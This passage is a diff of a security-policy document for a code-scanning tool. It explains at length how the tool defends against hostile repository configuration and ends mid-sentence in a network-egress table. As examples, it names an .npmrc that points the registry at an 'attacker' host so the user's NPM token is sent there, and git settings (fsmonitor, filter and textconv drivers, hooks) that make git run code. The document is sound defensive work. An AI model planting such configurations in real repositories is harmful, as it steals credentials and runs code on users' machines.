@@ -9,8 +9,8 @@ upgrade to the newest release.
 
 | Version | Supported |
 | ------- | --------- |
-| 2.0.x   | ✅        |
-| < 2.0   | ❌        |
+| 3.0.x   | ✅        |
+| < 3.0   | ❌        |
 
 ## Reporting a vulnerability
 
@@ -42,6 +42,32 @@ their respective projects.
 - **dev-guardian sends no telemetry of its own.** Results persist to
   `.guardian/guardian.db` in the scanned project and never leave it. Reports and
   the dashboard are self-contained and load no external assets.
+- **A project's database is used only when it is yours.** A database is its
+  writer's data: a trigger in a committed `.guardian/guardian.db` hid every
+  finding, and so did suppressions with no project in one whose schema was
+  exactly dev-guardian's, and scans dated in the future that outranked the
+  user's own. A database dev-guardian creates carries a random id registered
+  in a per-user registry, and is trusted only at the path it was registered
+  for (the id travels with a copy). Nothing else is trusted automatically —
+  not one from 3.0.0 or earlier, not a copy: nothing in a file tells its
+  owner from whoever wrote it. You register one yourself with `dev-guardian
+  db adopt` (CLI only, never an MCP tool — an assistant must not run it for
+  you): it shows what the database holds, flagging suppressions that apply to
+  every project and scans dated in the future, and registers it with `--yes`.
+  Refused even then: a database git tracks (in any case), a submodule, a link
+  or junction, a schema holding what the migrations never create (a trigger,
+  a view, an unknown table or index, a constraint added to a known table), or
+  any scan dated in the future. A foreign database is not opened for writing
+  and not modified: the per-user fallback (`%LOCALAPPDATA%\dev-guardian`,
+  `~/.local/share/dev-guardian`, or `GUARDIAN_DATA_DIR`) is used instead, and
+  `health_status` says why and what to do. No path stored in a database is
+  looked up to judge it (a `\\host\share` would reach the network). A file
+  SQLite cannot read, or a per-user directory that cannot be used, never
+  stops the server: it runs on the fallback or an in-memory database and
+  says history will not persist. History readers ignore scans dated in the
+  future, and say how many. `health_status` and `risk_score` also say how
+  many findings suppressions take out. Every connection runs with
+  `trusted_schema = OFF` and `cell_size_check = ON`.
 - **Secrets stay redacted.** gitleaks runs with `--redact`; a credential
   finding's snippet is cleared before it is stored, and cleared again before an
   exported report, a GitHub issue or the dashboard shows it. `suggest_fix`
@@ -162,9 +188,390 @@ their respective projects.
   can no longer hang either tool; a config that is there and was not read is
   named in `sources_unreadable`, is a failed pass in `tools_run`, and lowers
   coverage — never read as "no servers declared".
+- **A scanned repository does not configure Trivy.** Trivy reads `trivy.yaml`
+  from its working directory, and every Trivy pass used to run in the
+  project: a committed `trivy.yaml` of `severity: [UNKNOWN]` turned a project
+  with 7 known-vulnerable findings into a clean, fully covered scan (and the
+  CI gate's exit 1 into 0), and its `db.repository` or `server.addr` could
+  have sent the package list to a host of the repository's choosing. Every
+  Trivy pass now runs in a report directory the scan created, with `--config`
+  pointing at an empty file dev-guardian writes, and the target passed
+  explicitly (`mcp/src/runners/trivyRun.ts`). The project's `.trivyignore` is
+  still honoured — accepted risks are the project's to state — but only
+  explicitly (`--ignorefile`), and the run names it (`honoured_config`, and
+  its `tools_run` reason); `review_pr` warns when the diff edits it. What it
+  suppressed is counted and named in the scan's warnings and the CI gate's
+  output, JSON and SARIF (Trivy 0.50.0 or newer; `trivy config` cannot list
+  it and says so). `npm audit` still honours the project's `.npmrc` (a
+  private registry is legitimate), and `deps_audit` names the registry that
+  answered when it is not `registry.npmjs.org`, credentials removed.
+- **Nor Syft, nor a `.bandit` below the root; the rest is named.** Syft read
+  the project's `.syft.yaml` (`generate_sbom` ran in the project): a
+  committed `select-catalogers: ['-javascript']` emptied the SBOM of a
+  project pinning lodash, and the same file can turn on Syft's network
+  lookups. Syft now runs like Trivy (`mcp/src/runners/syftRun.ts`: a report
+  directory, `-c` pointing at an empty file, no update check). `bandit -r`
+  applied a `.bandit` found anywhere in the tree — a dependency's included —
+  to every file; it now gets `--ini`: the project's own root `.bandit`, or an
+  empty one. The configs a project legitimately owns and a scanner reads are
+  honoured and named on the run that read them, one way for every runner
+  (`honoured_config` and its reason, "honoured the project's X (what it
+  decides)"; the table is `mcp/src/runners/repoConfig.ts`, and a test fails
+  on a scanner spawned without an entry): `.trivyignore`, a root `.bandit`,
+  `.gitleaks.toml` and `.gitleaksignore`, `.hadolint.yaml` (hadolint now runs
+  in the report directory and is given it with `--config`),
+  `.github/actionlint.yaml`, `zizmor.yml` / `.github/zizmor.yml`, every
+  `.semgrepignore` (root and nested, on a whole-project Semgrep run —
+  Semgrep ignores them for files named explicitly), `.npmrc` whenever npm
+  audit read one, a `requirements*.txt` (or a file it includes with `-r` /
+  `-c`) whose index options decide where pip-audit's resolution installs
+  from, or whose direct, VCS or network references decide where it fetches
+  from (read by the same parser as `create_fix_pr`'s allowlist; whatever it
+  could not check — a URL include, an environment variable, a path or link
+  out of the project — is named as such: pip may take its sources from it),
+  a file at one of these paths that is a link, a FIFO or a directory
+  ("present, not checked"), `NuGet.config`, the .NET build's `.editorconfig`,
+  `.globalconfig` and `Directory.Build.props` / `.targets`, and quality_check's
+  ruff, jscpd, radon, staticcheck and ESLint configurations. `.guardianignore`
+  is named on every run of a scan it shapes.
+- **A pull request does not choose its own gate.** On a pull request, the
+  checkout's `.guardian/baseline.json`, Semgrep rules and ignore files are the
+  pull request's: read from there, a fork adopted its own finding into the
+  baseline, or deleted the rule that caught it, and passed. `scan
+  --baseline-ref <ref>` reads the baseline from a commit with git, and
+  `--rules-ref <ref>` copies the project's Semgrep rules, `.guardianignore`,
+  `.trivyignore` and `.bandit` from it (`mcp/src/ci/refConfig.ts`); the
+  `ci-init` pipelines pass the pull request's base. `.semgrepignore` and
+  gitleaks' two files, which no scanner flag can read from a ref, are put back
+  to the base's in the disposable CI checkout (`--reset-exclusions-from`,
+  refused anywhere else); actionlint's and zizmor's configuration and the .NET
+  build's files are named in the report whenever the pull request changes
+  them. The pipeline file itself runs from the
+  pull request's branch on every host: it needs a required review
+  ([docs/ci.md](docs/ci.md#a-pull-request-cannot-gate-itself)).
+- **What `install_toolchain` installs is pinned, and checked before it
+  runs.** Syft, Trivy and gitleaks came from routes that follow upstream —
+  Syft's `install.sh` piped from its `main` branch, Trivy from its apt
+  repository or `releases/latest`, gitleaks from `releases/latest` (in
+  `scripts/install/install-linux.sh`, which runs for the Linux defaults and
+  the Windows WSL fallback), scoop and choco on Windows — the route the
+  credential-stealing Trivy v0.69.4 took on 2026-03-19. Every install of
+  them now fetches one release (Syft 1.52.0, Trivy 0.74.0, gitleaks 8.30.1)
+  and checks the archive against a sha256 dev-guardian pins
+  (`PINNED_RELEASES` in `mcp/src/runners/installCatalog.ts`, each checked
+  against the release's checksums file, GitHub's asset digest and an
+  independent download) before unpacking it: `sha256sum` / `shasum` into
+  `~/.local/bin` on Linux and macOS, `Get-FileHash` in PowerShell into
+  `%USERPROFILE%\.local\bin` on Windows. The user's PATH is not changed (the
+  Windows installer warns when it lacks the directory); the server appends
+  that directory to its own PATH, after every other entry, so its scans find
+  the tool without shadowing one installed elsewhere, and `install_toolchain`
+  names where each binary went. A CPU with no pinned archive is refused. On
+  Windows, winget, scoop and choco are a fallback that asks for that same
+  version. On macOS, Trivy is the pinned archive first — the per-tool
+  install used to take the vendor's Homebrew tap (`aquasecurity/trivy`),
+  which installs Aqua's own release binaries rather than a Homebrew bottle
+  and was found at 0.69.3 — with homebrew-core's `trivy` formula as the
+  fallback, and `install-macos.sh` takes the same archive; Syft and gitleaks
+  come from Homebrew first (homebrew-core bottles, built by Homebrew, not
+  pinned to a version) with the pinned archive as the fallback. cosign's
+  installer was already pinned this way. A test holds the Linux script and
+  the macOS script's Trivy to the catalogue's versions and sums.
 - **Least privilege.** The MCP server reads and writes within the target project
   and its `.guardian/` directory, plus the temporary directories and user cache
   listed in [mcp/README.md](mcp/README.md#what-the-server-writes).
+- **The scanned repository's files are hostile input.** A clone, an archive or
+  a pull request chooses what is at every path in it — a link, a junction, a
+  FIFO, a device, a file of any size — and the server acts on it at startup,
+  before any tool call (it keeps `.guardian/` out of `.gitignore`). Every read
+  of a project file goes through `mcp/src/platform/projectFs.ts`: a path that
+  resolves outside the project (a link, `..`), a link to a network or device
+  path, anything but a regular file (judged by `fstat` on a descriptor opened
+  non-blocking, so a FIFO is never waited on), and a file over the caller's cap
+  are refused with a typed reason, and at most cap + 1 bytes are ever read.
+  Every write into the project `lstat`s the target and refuses a link (a
+  junction or a dangling link included) or a non-regular file, refuses a
+  directory on the way that resolves outside the project, and writes a temp
+  file beside the target that is then published with `link()` (create) or
+  `rename()` (replace) — never written through a link, never into an inode a
+  hard link shares. The tree hash hashes a link by its target text without
+  following it; a report directory (`.guardian/reports/…`) with a link on its
+  way is replaced by a fresh temp directory; `precommit_install` refuses a
+  `.git`, hooks directory or hook file that would send pre-commit's writes
+  elsewhere. A source-scan test lists every raw `fs` call left in `mcp/src`
+  with the reason it is not the repository's. The last repository reads it
+  named as not yet converted — in `runners/` (the scanner configs, the
+  manifests and lock files read for Trivy's gaps, the stack detector's
+  manifests, the project's Semgrep rule files) and `skillaudit/` — go through
+  it too now: a `package.json` linked to `/dev/zero` had OOM-killed the server
+  through `detect_stack`. Where a refused file would have changed what a tool
+  reports, the result names it (`detect_stack`'s `unread_files`, a warning, a
+  coverage gap). Bytes read are not memory used, so the parsers are bounded
+  too: lines are iterated, never split into an array; a lock file is parsed
+  only below a cap far under the read cap (above it Trivy's coverage gap is
+  kept, "not checked") and a JSON document is refused by its value count
+  before it is parsed. A YAML document passes four gates first
+  (`mcp/src/platform/boundedParse.ts`): its size (1 MiB for a configuration —
+  twelve times the largest rule pack shipped here — 5 MiB for an API spec), a
+  count of every character that can open, separate or decorate a node (so
+  nesting written on one line, `- - - … x`, counts), its nesting depth on the
+  parser's own syntax tree (64), and the size of its value once aliases are
+  followed (a "billion laughs", or an alias inside what it names, is refused);
+  a fuzz of adversarial shapes sized to those gates holds every admitted parse
+  under a second in `node:22 --memory 768m`; every walk that reads many files (`detect_stack`,
+  the manifest walk, the IaC walk, the WordPress inventory) shares one byte
+  and file budget, and a file past it is named. Nothing on a repository path
+  is `stat`'ed, `realpath`'ed or tested with `existsSync` before the links on
+  its way are walked with `lstat` — on Windows `existsSync` of a link to
+  `\\host\share` blocked for 157 s and authenticated to the host. A scanner,
+  a package manager and git itself (the hook's too) are spawned by the
+  absolute path the name resolves to on
+  PATH, looked up in-process: never a binary the repository planted in the
+  directory it runs in (`where`, libuv and `cmd.exe` all searched it first,
+  measured), and the server and the CLI set
+  `NoDefaultCurrentDirectoryInExePath` and drop relative PATH entries for
+  every other spawn. Both changes are to the process's own environment, so
+  every child — a scanner, a package manager, the project's own test command —
+  inherits them: `NoDefaultCurrentDirectoryInExePath=1`, and a PATH with no
+  empty or relative entry (a script that relied on `.` in PATH no longer
+  finds what it ran from there). **Not converted**: the `.guardian/guardian.db`
+  the storage layer opens.
+- **A scanned repository's own git configuration runs nothing.** A repository
+  delivered with its own `.git/` (an archive, a ZIP download, a shared folder)
+  names programs git runs: `core.fsmonitor` on `status` and `ls-files`; hooks in
+  `.git/hooks` on an index write, a checkout and a commit (`--no-verify` still
+  runs `prepare-commit-msg`, `post-commit` and `reference-transaction`); a
+  filter driver's `clean`, `smudge` or `process` on `status`, `diff HEAD` and a
+  checkout; a textconv driver, and `gpg.program` under `log.showSignature`, on
+  the `git log -p` gitleaks runs; `core.sshCommand`, `core.askPass`, a
+  credential helper or `remote.<name>.receivepack` on a push. Measured before
+  this was fixed: `scan_sast` ran a repository's `core.fsmonitor` through
+  Semgrep's own `git ls-files`, `scan_secrets` ran its textconv driver through
+  gitleaks, and the SessionStart hook ran `core.fsmonitor`, the clean filter
+  and `post-index-change` when a session merely opened the project. Every git
+  dev-guardian starts — itself, and inside every scanner, package manager or
+  script it runs — now takes configuration overrides from its environment
+  (`GIT_CONFIG_COUNT`, appended after your own entries, which are kept), which
+  outrank every file the repository has (`mcp/src/platform/gitSafety.ts`):
+  - always: `core.fsmonitor=false`; `core.hooksPath` at a path that cannot
+    exist (beneath the Node executable on Windows, beneath `/dev/null`
+    elsewhere); `protocol.ext.allow=never`; `log.showSignature=false`;
+    `gc.auto=0` and `maintenance.auto=false`; `diff.submodule=short` (a
+    repository's `diff.submodule=diff` made gitleaks' `git log -p` diff inside
+    a submodule, running its textconv driver — measured); and `GIT_PAGER=cat`,
+    `GIT_EDITOR=:`, `GIT_SEQUENCE_EDITOR=:`;
+  - for the repository at hand, read first with `git config --get-regexp`
+    (which runs nothing) from its `local` and `worktree` scopes — every file
+    they pull in with `include.path` or `includeIf` included: each filter
+    driver's commands emptied and its `required` set false, each textconv
+    driver `cat`, external diff and merge drivers emptied, `core.sshCommand`
+    `ssh` (or your `GIT_SSH`), the gpg programs git's defaults,
+    `core.askPass`, aliases and `core.alternateRefsCommand` emptied, and the
+    credential-helper list reset to your own. Where your system or global
+    configuration sets the same key, your value is used instead. A repository
+    `core.gitProxy` (first match wins) is answered with an empty
+    `GIT_PROXY_COMMAND` unless you set one; a repository
+    `remote.<name>.uploadpack` (first value wins) with `GIT_NO_LAZY_FETCH=1`;
+  - what decides where, and how, a git sends your credentials over HTTP — each
+    measured to apply from a repository's own configuration, each measured
+    overridden against local servers: `http[.<url>].extraHeader` (a header on
+    every request) is reset under the repository's own key and your own
+    headers for that URL replayed — never a header you set for another URL;
+    `http[.<url>].proxy` and `remote.<name>.proxy` become your own proxy
+    variable (`https_proxy`, `http_proxy`, `all_proxy`) or none;
+    `http[.<url>].sslVerify` becomes `true`, and `.sslCAInfo` / `.sslCAPath`
+    empty — the handshake then fails rather than trust a certificate authority
+    of the repository's choosing; `.cookieFile` empty and `.saveCookies`
+    false (a plain git WROTE its cookie jar to the path the repository chose);
+    `.followRedirects` `initial`. A URL-specific key is overridden under its
+    own key: git keeps the most specific match per URL, and a generic override
+    appended after it loses (measured). `url.<base>.insteadOf` and
+    `pushInsteadOf` cannot be overridden: `create_fix_pr` refuses to push, and
+    names the key, when one from the repository's own configuration rewrites
+    origin's push URL (yours still apply);
+  - every initialised submodule, the same way — git goes into each one on a
+    `status` or a `diff` of the work tree, where the submodule's OWN
+    configuration (`.git/modules/<name>/config`, or an old-style in-tree
+    `sub/.git/`) names its own drivers. Measured: a superproject
+    `git status --porcelain` ran clean filters defined only in an absorbed
+    submodule, in a submodule of that submodule, and in an in-tree one. Each
+    gitlink in the index whose directory holds a `.git` is read, nested ones
+    too, and its keys added to the overrides (named `… (submodule <path>)`).
+    Where a query needs nothing inside a submodule's work tree —
+    SessionStart's count, the working-tree file listings, `create_fix_pr`'s
+    tree state, the CI gate's configuration diff — it also passes
+    `--ignore-submodules=dirty`, which keeps git out of the submodule and
+    still reports a submodule whose commit moved (measured). The auto_fix
+    guard and CI's clean-checkout check keep full recursion — uncommitted work
+    inside a submodule is still work — safe through the first layer;
+  - dev-guardian's own commit passes `--no-verify`, and its push
+    `--no-verify --receive-pack=git-receive-pack`. To a repository on this
+    machine the receive-pack is `git -c … receive-pack` carrying that
+    destination's own overrides: git removes `GIT_CONFIG_COUNT` from a local
+    receive-pack's environment (measured — the destination's hooks ran). A
+    checkout (`review_pr`'s head, `create_fix_pr`'s worktrees) is
+    `worktree add --no-checkout`, then `reset --hard --no-recurse-submodules`
+    inside the new worktree, so an `includeIf` that matches the new worktree
+    is read — and neutralised — where the checkout runs, and a
+    `submodule.recurse=true` (yours or the repository's) does not send the
+    reset into submodules the worktree was never given. Semgrep's Docker
+    fallback gets the overrides with `-e`.
+  - A repository whose configuration cannot be read safely — a key or a
+    submodule path that is not UTF-8, more than 200 command keys, more than 64
+    initialised submodules or more than 8 levels of them, a read that takes
+    over 10 s — is not run, and the tool says why. So is every repository
+    when the git on `PATH` does not read `GIT_CONFIG_COUNT` (older than 2.31).
+    What a run did not apply is named: `review_pr`'s warnings, the gitleaks
+    history pass's reason, `create_fix_pr`'s `git_config_not_applied`.
+  - **Limits.** Not hardened: the test command `create_fix_pr` runs and the
+    application the DAST gate starts — both are the project's own code, run by
+    design; `precommit_install` keeps every override but the hooks redirect
+    (installing hooks where git says they go is its job; pre-commit's own git
+    calls are `rev-parse` and `config`). A filter or textconv driver defined
+    in YOUR configuration (git-lfs) still runs when the repository maps a
+    file to it: your program, the repository's input. Conditional includes
+    are evaluated in the directory a process starts in: a scanner that enters
+    another repository by itself (none of dev-guardian's do) carries the
+    static layer and the first repository's overrides, not the other's. The
+    configuration is read, then used, by separate processes, and one reading
+    serves every git started in the same directory and environment for up to
+    2 s: a local user who can rewrite `.git/config` in between is not
+    stopped. Lazy fetching is
+    refused only by a git that knows `GIT_NO_LAZY_FETCH` (measured: 2.52.0 and
+    2.39.5 do). `remote.<name>.vcs` names a remote helper, which must already
+    be installed. Git 2.52 has no configuration-defined hooks
+    (`hook.<name>.command`); a later git that adds them is not covered by
+    `core.hooksPath`. Keys read only by commands dev-guardian never runs —
+    `difftool`, `mergetool`, `sendemail`, `submodule.<name>.update`,
+    `trailer.<key>.cmd`, `web.browser` — are not overridden. A repository's
+    `core.worktree` can still point git's file listing at another directory:
+    a read, not an execution. On Windows the textconv identity `cat` is Git
+    for Windows' own; where git cannot find it, git fails, loudly.
+    Submodules: one that is not initialised (no `.git` in its directory) is
+    not read — git does not go into it either; nor is an untracked nested
+    repository, which a `status` lists as `?? dir/` without entering
+    (measured). Over HTTP, not overridden: `http.sslCert` / `sslKey`,
+    `sslVersion` / `sslCipherList`, the proxy's own TLS and authentication
+    settings; the neutral proxy for a key that names no URL is the first of
+    your `https_proxy`, `HTTPS_PROXY`, `http_proxy`, `all_proxy`,
+    `ALL_PROXY`, which can differ from git's per-scheme choice; a repository
+    that legitimately sets its own `sslCAInfo` cannot reach its server under
+    dev-guardian (set it in your own configuration). A repository's own
+    `url.<base>.insteadOf` is refused only for `create_fix_pr`'s push; any
+    other network git in the project — a package manager resolving a git
+    dependency in `create_fix_pr`'s worktree, `gh` — still follows it.
+- **Repository text is escaped before it is shown.** A rule message, a
+  snippet, a file name, a reason or a title can carry characters that render
+  as nothing or reorder what does (a right-to-left override, a zero-width
+  space, ESC). Every string in every tool result and resource — keys included
+  — is passed through `untrustedText` (`mcp/src/platform/untrustedText.ts`) at
+  the MCP response boundary, and to every progress notification's message:
+  C0 and C1 controls (except `\n` and `\t` outside a path, name or id; a
+  Windows `\r\n` in a multi-line field is read as `\n`, a lone `\r` is
+  escaped), bidi controls and every other default-ignorable code point are
+  written as a visible `\u{XXXX}`. The emoji sequences, keycaps,
+  CJK variation selectors and subdivision flags `audit_mcp_tools` already
+  exempts pass unchanged, and so does every other character: a `日本.py` stays
+  `日本.py`. Stored findings are unchanged; only what is shown is escaped. The
+  CLI's human output (`scan`, `baseline update`, `check`) is escaped the same
+  way, and `status` still strips terminal escape sequences.
+- **`create_fix_pr` runs the project's code.** To judge a candidate fix it runs
+  the project's own test command — `npm test` (`scripts.test`), `pytest` (every
+  `conftest.py`), `cargo test` (`build.rs`), `go test` — in its worktrees,
+  **on a dry run too**, and its description says so. That command runs with an
+  allowlisted environment (`extendEnv: false`): `PATH`, the home and temp
+  directories, the locale, `CI`, the variables every Windows process expects,
+  and the toolchains' own (`NODE_*`, `PYTHON*`, `CARGO_HOME`, `RUSTUP_HOME`,
+  `GOPATH`, `GOCACHE`, …), with any name that looks like a credential
+  (`TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, `API_KEY`, …), every `GUARDIAN_*`
+  and every `npm_config_*` removed — no token or cloud credential the server
+  was started with reaches it. It is still the repository's code, running as
+  you, with your files: run `create_fix_pr` only on a repository whose tests
+  you would run yourself.
+- **A repository never chooses where `create_fix_pr`'s package managers send
+  your credentials.** A repository `.npmrc` with `registry=https://attacker/`
+  and `//attacker/:_authToken=${NPM_TOKEN}` made `npm outdated`, `npm ci`,
+  `npm install` and `npm audit` in its checkouts fetch from that host with
+  your own token (`--ignore-scripts` does not stop a fetch); a scoped
+  registry (`@acme:registry=…`) is the same route, and a requirements file's
+  `--index-url` makes `pip-audit` install from — and build sdists fetched
+  from — the repository's index. In every checkout `create_fix_pr` works in
+  (the planning tree, the fix's worktree, the base-commit tree), the
+  repository's own `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`,
+  `pip.conf`, `pip.ini`, `.pip/`, `.cargo/config.toml` / `.cargo/config`,
+  `.bundle/config` and `NuGet.config` — in the project's directory and every
+  directory above it in the checkout — are moved out before any package
+  manager runs, named in the group's `package_config_set_aside`, and put back
+  before anything is committed. Every package-manager process it runs, itself
+  or through `deps_update_plan` and `deps_audit` (`npm`, `pip-audit`,
+  `composer`, `bundle`, `cargo`, `go`, `dotnet restore`), gets the test
+  command's allowlisted environment plus your own package-manager
+  configuration: the `NPM_CONFIG_*`, `YARN_*`, `PIP_*`, `COMPOSER_*`,
+  `CARGO_REGISTRIES_*`, `BUNDLE_*`, `NUGET_*`, `GOPROXY`-family and proxy
+  variables, and exactly the variables your own `~/.npmrc` (or the file
+  `NPM_CONFIG_USERCONFIG` names), `~/.yarnrc` and `~/.yarnrc.yml` reference
+  as `${VAR}` — so a token you configured for your own registry still
+  reaches it, and only it. Python requirements are held to an **allowlist,
+  and it fails closed** (`mcp/src/deps/pipRequirements.ts`): pip installs —
+  a pip step, or any re-scan by `deps_audit`, whose pip-audit installs them
+  — only when every logical line of every requirements file, read the way
+  pip reads it (its BOMs and UTF-16, a `# -*- coding` declaration, every
+  line break `str.splitlines` knows, `\` continuations joined, comments not
+  joined), is blank, a comment, a plain PEP 508 requirement with no URL
+  (a name, extras, versions, markers, `--hash`), or a `-r` / `-c` include
+  (`-rbase.txt` glued, `--requirement=…`, or an absolute path) that stays
+  inside the checkout, which is read the same way (at most 200 files).
+  Anything else refuses the fix with the file, the line and the
+  kind named, and a host as `scheme://host` only — never a user name,
+  password, port, path or query: an index option in any spelling pip
+  accepts (`--index`, `-ihttps://…`), an editable, a direct reference, a
+  bare or VCS URL, a local or network path (`\\host\share`,
+  `file://host/…`), an environment variable, a quoted or escaped option,
+  an encoding pip would read differently (UTF-7, UTF-32), an include that
+  leaves the checkout or is a URL, and a file that could not be read. The
+  rule was held to pip 26.2.1's own `RequirementsFileParser`: for every
+  bypass of the regular expressions it replaced — and more — where pip
+  chooses a source, dev-guardian refuses (`test/unit/deps/pipAllowlist.test.ts`).
+  `pyproject.toml` and `setup.cfg` meet the same rule — `[project]`
+  dependencies, optional dependencies, dependency groups and build
+  requirements must be plain, and a tool's own source table (`[tool.uv.sources]`,
+  `[[tool.uv.index]]`, `[[tool.poetry.source]]`, a Poetry `git`/`url`/`path`
+  dependency, `[tool.pdm.source]`, Hatch's `allow-direct-references`,
+  `dependency_links`) refuses; when pip-audit would build the project itself,
+  dependencies the build backend decides (`dynamic`, no `[project]`) refuse
+  too. Failing closed has costs, and these are the known ones: an
+  abbreviated or quoted option pip would accept (`--requirem`, `-r "a.txt"`),
+  an include written with a backslash (pip's parser reads `-r reqs\base.txt`
+  as `reqsbase.txt` — measured — so the refusal says pip would open a
+  different file), a `~`, drive-relative or rootless-on-Windows include, a
+  chain past 200 requirements files, an environment variable anywhere, a
+  UTF-7 or UTF-32 file, and a local or `file:` requirement inside the checkout
+  are all refused although some are harmless; `requirements.in`-style
+  indirection is followed only through plain includes. An npm install —
+  `create_fix_pr`'s planning, its npm steps, and its test environment's
+  `npm ci` — also **fails closed**: it is refused when a dependency, an
+  override, a resolution or any lock entry points at a network path
+  (`file:\\host\…`, `file://host/…`), and when any file npm reads could not
+  be fully read and checked — `package.json`, `package-lock.json`,
+  `npm-shrinkwrap.json`, `yarn.lock` and every workspace member's
+  `package.json` (a lock past the parse bound or the size cap, one that is
+  not JSON, a FIFO, a link out, a member the walk could not reach): Windows
+  would authenticate to the host, and npm reads what this check could not.
+  `deps_audit` itself does not
+  refuse: it names, per file, the index options, the direct, VCS and network
+  references and whatever it could not check, on the run
+  (`honoured_config`). So is a Composer fix whose
+  `composer.json` declares `repositories` (the manifest the fix edits cannot
+  be set aside); the planner does not plan Composer there either. A
+  lockfile's own `resolved` URLs still choose where npm fetches each locked
+  tarball from, but not where your token goes: measured with real npm
+  (11.17.0 on Windows, 10.9.8 in `node:22`) and two local registries, `npm ci` and
+  `npm install` fetched a tarball the lock placed on another host without
+  any `Authorization` header, while the tarball on your own registry carried
+  your token — npm scopes a token to the host it was configured for, and a
+  test holds `create_fix_pr` to it. Not covered: the scans a user runs
+  outside `create_fix_pr`, which keep their environment and the repository's
+  configuration.
 
 ## Network egress
 
@@ -194,29 +601,31 @@ project's own build and test commands.
 
 | Destination | Who triggers it | When |
 | --- | --- | --- |
-| Semgrep registry (`semgrep.dev`) — rules download **and usage metrics to Semgrep Inc.** | `scan_sast` and `security_scan_full` (`--config=auto`), `review_pr`, `bug_hunt` (`p/r2c-bug-scan`, `p/security-audit`, optional language packs), `scan_wordpress` (`p/php`, `p/wordpress`), `init_project`'s first-pass status report (`semgrep --config=auto`, when a bash is available) | by default. Semgrep refuses `--config=auto` with metrics off, so `scan_sast`, `security_scan_full`, `review_pr` and the CLI's `--local-only` offer `local_only: true`: only rules on disk, `--metrics=off`, nothing sent to Semgrep's registry or metrics endpoint. `bug_hunt` and `scan_wordpress` have no local-only mode. Semgrep's `--metrics=auto` also sends metrics with local rules when you are logged in to Semgrep, which is how `map_attack_surface` can send them. What Semgrep collects: <https://semgrep.dev/docs/metrics>. `compliance_check` (RGPD pack) and `create_fix_pr`'s autofix always run with `--metrics=off`. |
-| Semgrep's version check (Semgrep servers) | every Semgrep run — `local_only` and `check_toolchain`'s `semgrep --version` included | on by default in Semgrep; dev-guardian does not turn it off. `SEMGREP_ENABLE_VERSION_CHECK=0` in the server's environment does. |
-| The project's NuGet feeds, and its MSBuild code | `scan_sast` on a .NET project (`dotnet restore --locked-mode`, then `dotnet build`) — **even with `local_only: true`** — and so `security_scan_full`, the CLI `scan` and `create_fix_pr`'s re-scans; `deps_audit` and `deps_update_plan` (`dotnet restore`, `dotnet list package`) | when the .NET SDK is installed: for `scan_sast`, whenever a root `.csproj` / `.fsproj` / `.sln` / `.slnx` is present; for `deps_audit` and `deps_update_plan`, for every `.sln` / `.csproj` they find. A restore and a build execute the project's own MSBuild targets. |
+| Semgrep registry (`semgrep.dev`) — rules download **and usage metrics to Semgrep Inc.** | `scan_sast` and `security_scan_full` (`--config=auto`), `review_pr`, `bug_hunt` (`p/r2c-bug-scan`, `p/security-audit`, optional language packs), `scan_wordpress` (`p/php`, `p/wordpress`), `audit_executive` (through `security_scan_full`, and `scan_wordpress` on a WordPress project), `init_project`'s first-pass status report (`semgrep --config=auto`, when a bash is available) | by default. Semgrep refuses `--config=auto` with metrics off, so `scan_sast`, `security_scan_full`, `review_pr`, `audit_executive` and the CLI's `--local-only` offer `local_only: true`: only rules on disk, `--metrics=off`, nothing sent to Semgrep's registry or metrics endpoint. `bug_hunt` and `scan_wordpress` have no local-only mode; `audit_executive` with `local_only` skips `scan_wordpress` and says so. Semgrep's `--metrics=auto` also sends metrics with local rules when you are logged in to Semgrep, which is how `map_attack_surface` can send them. What Semgrep collects: <https://semgrep.dev/docs/metrics>. `compliance_check` (RGPD pack) and `create_fix_pr`'s autofix always run with `--metrics=off`. |
+| Semgrep's version check (`semgrep.dev`) | **disabled by dev-guardian**: every Semgrep run gets `SEMGREP_ENABLE_VERSION_CHECK=0` — native runs (`mcp/src/runners/semgrepRun.ts`), the Docker fallback's container (`-e`), `check_toolchain`'s `semgrep --version`, and `init_project`'s status script | never. Measured through a refusing proxy on 1.176.1: `semgrep --version`, and a scan with local rules and `--metrics=off`, each asked for `semgrep.dev` four times with a fresh home; with the variable, neither asked, and the scan's results were the same. |
+| The project's NuGet feeds, and its MSBuild code | `scan_sast` on a .NET project (`dotnet restore --locked-mode`, then `dotnet build`) — **even with `local_only: true`** — and so `security_scan_full`, `audit_executive`, the CLI `scan` and `create_fix_pr`'s re-scans; `deps_audit` (and `audit_executive`, which runs it) and `deps_update_plan` (`dotnet restore`, `dotnet list package`) | when the .NET SDK is installed: for `scan_sast`, whenever a root `.csproj` / `.fsproj` / `.sln` / `.slnx` is present; for `deps_audit` and `deps_update_plan`, for every `.sln` / `.csproj` they find. A restore and a build execute the project's own MSBuild targets. |
 | Docker registry (`semgrep/semgrep` image) | `scan_sast`, `map_attack_surface` | only when Semgrep is not installed and Docker is |
-| Trivy's vulnerability database and misconfiguration checks bundle | `scan_deps`, `deps_audit`, `scan_containers`, `scan_iac`, `review_pr`, `scan_wordpress`, `init_project`'s status report | when Trivy needs them and its local cache is stale; `scan_containers` may also pull the image it is given |
+| Trivy's vulnerability database and misconfiguration checks bundle | `scan_deps`, `deps_audit`, `scan_containers`, `scan_iac`, `review_pr`, `scan_wordpress`, `security_scan_full` and `audit_executive` (through them — **even with `local_only: true`**), `init_project`'s status report | when Trivy needs them and its local cache is stale; `scan_containers` may also pull the image it is given |
 | The image's registry, and Sigstore's public-good trust root (`tuf-repo-cdn.sigstore.dev`) — Rekor (`rekor.sigstore.dev`) only for a signature that carries no inclusion proof | `scan_containers` given an `image`, which runs cosign ★: `cosign triangulate` (to pin the digest), then `cosign download signature` and `cosign download attestation` without a signer, `cosign verify` with `signer_identity` + `signer_issuer` (Sigstore's trust root is fetched for `verify` only) — all of one image's calls within one deadline, `GUARDIAN_SCAN_TIMEOUT_MS` | per call, when cosign is installed; `GUARDIAN_OFFLINE=1` starts no cosign at all (`cosign` is then skipped and in `missing_tools`). cosign reads registry credentials from the Docker config, like Trivy, and keeps its trust root under `~/.sigstore`. It never signs, attests or pushes anything. The downloads that decide an absence run with cosign's `-d` request log, which is parsed, never stored or forwarded (go-containerregistry already writes `Authorization: <redacted>`; URL query strings — a CDN's signed URL — are cut from every reason, finding and log line): what is attached is the referrers index the registry itself generated, read from that log (never `cosign tree`, which prints a pusher's annotation as it finds it), and whether each referrer was served is the registry's own status for its manifest and bundle. Two registry faults cosign itself does not report. (1) A referrer whose manifest or bundle blob the registry fails to serve (a 